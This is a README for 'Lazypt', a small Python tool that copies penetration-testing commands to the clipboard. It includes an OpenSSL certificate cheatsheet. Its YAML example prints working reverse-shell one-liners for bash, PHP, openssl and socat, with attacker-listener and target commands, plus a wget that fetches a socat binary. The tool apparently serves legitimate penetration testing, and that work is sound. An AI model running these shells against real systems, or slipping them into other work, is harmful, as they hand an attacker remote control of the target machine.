# Lazypt v0.1

Lazypt is a simple Python program that pastes to your clipboard some common penetration testing commands. Ths version works on linux. Change pathmanager.py to fix the path for Windows OS.

## Features

- Reverse shell cheatsheet
- Openssl certificates conversion/generation cheatsheet

### Reverse shell cheatsheet
The following reverse shell commands are available. They can be expanded with your custom cheatsheet by editing the file revshell.yaml
- py
- pl
- sh
- php
- rb
- awk
- openssl
- socat

### YAML example

```yaml
---
- sh:
    code: bash -i >& /dev/tcp/{}/{} 0>&1
- php:
    code: php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
- openssl:
    code: |-
       Attacker> ncat --ssl -vv -l -p {}
       Target> mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {}:{} > /tmp/s; rm /tmp/s
- socat:
    code: |-
      Attacker> socat file:`tty`,raw,echo=0 tcp-listen:{}
      Target> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}
      Socat binary> wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```

place {} where you want to put LHOST and LPORT passed to the program as args.


### OpenSSL cheatsheet
The following openssl commands are available. They can be expanded with your custom cheatsheet by editing the file openssl.yaml
- Command to generate a Private Key and a CSR
- Command to generate a CSR from an Existing Private Key 
- Command to generate a CSR from an Existing Certificate and Private Key
- Command to generate a Self-Signed Certificate
- Command to generate a Self-Signed Certificate from an Existing Private Key
- Command to generate a Self-Signed Certificate from an Existing Private Key and CSR
- Command to convert PEM to DER
- Command to convert DER to PEM
- Command to convert PEM to PKCS7
- Command to convert PKCS7 to PEM  
- Command to convert PEM to PKCS12
- Command to convert PKCS12 to PEM
    
## Dependencies
- click
- pyperclip
- pyYAML

## Installation

```bash
git clone https://github.com/AndyBTuttofare/lazypt.git
cd lazypt
python setup.py install
```

## Usage

```bash
Usage: lazypt rsh [OPTIONS] LHOST LPORT [py|pl|sh|php|rb|awk|openssl|socat]

  Copy the chosen reverse shell code to the clipboard. It allows to switch
  the scripting language. (Does not run the commands)

Options:
  --help  Show this message and exit.
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.


## License
[MIT](https://choosealicense.com/licenses/mit/)
